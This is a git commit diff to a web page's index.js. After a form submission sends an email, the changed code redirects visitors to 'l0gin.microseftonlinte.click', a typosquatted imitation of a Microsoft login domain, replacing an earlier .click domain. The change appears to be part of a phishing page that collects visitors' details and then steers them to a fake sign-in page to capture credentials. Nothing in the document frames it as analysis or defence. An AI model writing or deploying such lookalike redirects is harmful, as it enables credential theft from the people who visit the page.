b40563d0f0bd3752458f8952d2f698c07db62b50
husknet <127146284+husknet@users.noreply.github.com>
2024-10-08 12:34:15 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://nero.sagemarketing-dashboard.click';
+        window.location.href = 'https://l0gin.microseftonlinte.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
